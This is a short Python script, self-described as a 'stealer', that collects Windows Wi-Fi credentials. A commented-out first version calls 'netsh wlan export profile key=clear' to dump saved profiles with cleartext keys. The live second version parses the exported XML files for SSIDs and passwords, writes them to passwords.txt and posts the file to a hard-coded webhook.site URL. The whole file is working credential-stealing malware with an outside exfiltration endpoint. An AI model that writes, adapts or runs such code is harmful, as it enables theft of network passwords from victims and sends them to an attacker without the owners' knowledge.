# import subprocess
import os
# import sys
# import requests

# # Stealer URL
# url = 'https://webhook.site/a10369dc-bb77-4471-b823-83646bc8bab2'


# # Create a file
# with open("passwords.txt", 'w') as password_file:
#     password_file.write("Hello 1023!, Here are your passwords:\n\n")
    
    
# # Put the Data that we are gahthering into list
# wifi_files = []
# wifi_name = []
# wifi_password = []



# # Use Python To Execute Windows Command
# command = subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], capture_output=True).stdout.decode()


# # Grab Current Directory
# path = os.getcwd()


# # Do the hackies
# for filename in os.listdir(path):
#     if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
#         wifi_files.append(filename)
#         for i in wifi_files:
#             with open(i, 'r') as f:
#                 for line in f.readlines():
#                     if 'name' in line:
#                         stripped = line.strip()
#                         front = stripped[6:]
#                         back = front[:-7]
#                         wifi_name.append(back)
#                     if 'KeyMaterial' in line:
#                         stripped = line.strip()
#                         front = stripped[13:]
#                         back = front[:-14]
#                         wifi_password.append(back)
#                         print(wifi_password[0])
#                         for x, y in zip(wifi_name, wifi_password):
#                             sys.stdout = open("passwords.txt", 'a')
#                             print("SSID: "+x, "Password: "+y, sep='\n')
#                             sys.stdout.close()                        


# # Send the hackies

# with open('passwords.txt', 'rb') as f:
#     r = requests.post(url, data=f)

import os
import requests
import xml.etree.ElementTree as ET


# Stealer URL
url = 'https://webhook.site/a10369dc-bb77-4471-b823-83646bc8bab2'

# Create a file
output_file_path = "passwords.txt"
with open(output_file_path, 'w') as password_file:
    password_file.write("Hello 1023!, Here are your passwords:\n\n")

# Put the Data that we are gathering into lists
wifi_name = []
wifi_password = []

# Grab Current Directory
path = os.getcwd()

# Process XML files in the current directory
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        tree = ET.parse(filename)
        root = tree.getroot()

        ssid = None
        password = None

        # Iterate over elements in the XML tree
        for elem in root.iter():
            if 'name' in elem.tag:
                ssid = elem.text
            if 'keyMaterial' in elem.tag:
                password = elem.text

        if ssid is not None and password is not None:
            wifi_name.append(ssid)
            wifi_password.append(password)

# Open the file once before the loop
with open(output_file_path, 'a') as password_file:
    for x, y in zip(wifi_name, wifi_password):
        password_file.write(f'SSID: {x}\nPassword: {y}\n')
        
        
# Send the hackies

with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)
